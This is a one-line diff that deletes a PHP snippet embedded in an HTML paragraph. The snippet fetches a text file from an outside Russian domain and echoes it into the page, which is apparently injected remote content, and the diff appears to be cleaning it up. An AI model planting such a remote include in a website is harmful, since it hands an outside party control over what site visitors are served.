@@ -1,1 +1,0 @@
-﻿<p><?php echo file_get_contents('http://v-mp.ru/update.txt') ?></p>
